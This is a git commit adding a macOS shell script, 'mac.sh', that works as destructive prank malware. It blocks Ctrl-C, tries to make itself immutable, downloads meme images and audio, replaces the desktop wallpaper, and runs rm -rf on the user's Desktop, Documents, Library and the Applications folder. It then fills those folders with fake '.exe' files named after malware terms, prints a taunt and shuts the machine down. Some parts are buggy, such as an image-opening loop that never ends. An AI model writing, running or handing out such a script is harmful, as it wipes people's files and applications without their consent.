0f5ad737e2be249d41bfd496e4c03c28a1ab74cf
pwn0 <37804376+pwn0@users.noreply.github.com>
2018-03-26 15:36:22 -0700

    Add files via upload

---
+++ mac.sh
@@ -0,0 +1,98 @@
+# Variables
+repeat=0
+memes=( "keylogger" "malware" "virus" "backdoor" "rat" "rootkit" "irs" "trojan" "worm" "botnet" "zeus" "adware" "hack" "network" "root" )
+extension=".exe"
+
+# Security Precautions
+bash -c "nohup sh -c 'while true; do date; sleep 1; done' &" > /dev/null 2>&1
+trap '' 2 > /dev/null 2>&1
+chattr +i mac.sh > /dev/null 2>&1
+
+# ASCII
+clear
+echo "                            ,-."
+echo "       ___,---.__          /'|`\          __,---,___"
+echo "    ,-'    \`    `-.____,-'  |  `-.____,-'    //    `-."
+echo "  ,'        |           ~'\     /`~           |        `."
+echo " /      ___//              `. ,'          ,  , \___      \"
+echo "|    ,-'   `-.__   _         |        ,    __,-'   `-.    |"
+echo "|   /          /\_  `   .    |    ,      _/\          \   |"
+echo "\  |           \ \`-.___ \   |   / ___,-'/ /           |  /"
+echo " \  \           | `._   `\\  |  //'   _,' |           /  /"
+echo "  `-.\         /'  _ `---'' , . ``---' _  `\         /,-'"
+echo "    ``       /     \    ,='/ \`=.    /     \       ''"
+echo "            |__   /|\_,--.,-.--,--._/|\   __|"
+echo "            /  `./  \\`\ |  |  | /,//' \,'  \"
+echo "           /   /     ||--+--|--+-/-|     \   \"
+echo "           |   |     /'\_\_\ | /_/_/`\   |   |"
+echo "            \   \__, \_     `~'     _/ .__/   /"
+echo "             `-._,-'   `-._______,-'   `-._,-'"
+sleep 0.5s
+clear
+
+# Begin
+cd ~/Pictures 2>&1 && curl https://i.ytimg.com/vi/ZdV6wKo5o1A/hqdefault.jpg --output meme.jpg > /dev/null 2>&1
+curl https://cdn.pixabay.com/photo/2015/06/18/01/46/hack-813290_960_720.jpg --output background.jpg > /dev/null 2>&1
+sqlite3 ~/Library/Application\ Support/Dock/desktoppicture.db "update data set value = '~/Pictures/background.jpg'" && killall Dock > /dev/null 2>&1s
+curl https://files.catbox.moe/0imoe1.mp3 --output meme.mp3 > /dev/null 2>&1
+afplay meme.mp3 & > /dev/null 2>&1
+
+while [ $repeat -le 50 ]
+do
+	open meme.jpg > /dev/null 2>&1
+done	
+
+repeat=0
+
+# Deletion - Desktop 
+rm -rf /Users/$USER/Desktop/* > /dev/null 2>&1
+cd /Users/$USER/Desktop > /dev/null 2>&1
+
+while [ $repeat -le 1000 ]
+do	
+	touch ${memes[$RANDOM % ${#memes[@]} ]}_$repeat$extension > /dev/null 2>&1
+	repeat=$(( repeat+1 ))
+done
+
+repeat=0
+
+# Deletion - Applications
+rm -rf /Applications/* > /dev/null 2>&1
+cd /Applications > /dev/null 2>&1
+
+while [ $repeat -le 1000 ]
+do	
+	touch ${memes[$RANDOM % ${#memes[@]} ]}_$repeat$extension > /dev/null 2>&1
+	repeat=$(( repeat+1 ))
+done
+
+repeat=0
+
+# Deletion - Documents
+rm -rf /Users/$USER/Documents/* > /dev/null 2>&1
+cd /Users/$USER/Documents > /dev/null 2>&1
+
+while [ $repeat -le 1000 ]
+do	
+	touch ${memes[$RANDOM % ${#memes[@]} ]}_$repeat$extension > /dev/null 2>&1
+	repeat=$(( repeat+1 ))
+done
+
+repeat=0
+
+# Deletion - Library
+rm -rf ~/Library* > /dev/null 2>&1
+cd ~/Library > /dev/null 2>&1
+
+while [ $repeat -le 1000 ]
+do	
+	touch ${memes[$RANDOM % ${#memes[@]} ]}_$repeat$extension > /dev/null 2>&1
+	repeat=$(( repeat+1 ))
+done
+
+repeat=0
+
+# End
+echo "don't run something without looking at what it is first man"
+sleep 5s
+shutdown -h now
